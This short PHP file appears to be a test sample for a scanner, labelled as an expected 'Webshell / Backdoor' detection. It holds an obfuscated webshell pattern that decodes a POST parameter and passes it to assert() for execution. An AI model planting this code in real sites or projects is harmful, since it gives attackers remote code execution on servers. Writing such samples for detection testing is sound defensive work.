<?php
// phpscan: expect: Webshell / Backdoor
// typical obfuscated one-liner pattern
$d = base64_decode($_POST["c"]);
$d = gzinflate($d);
$fn = "rea" . "lpath";
$fn($d);
assert($d);
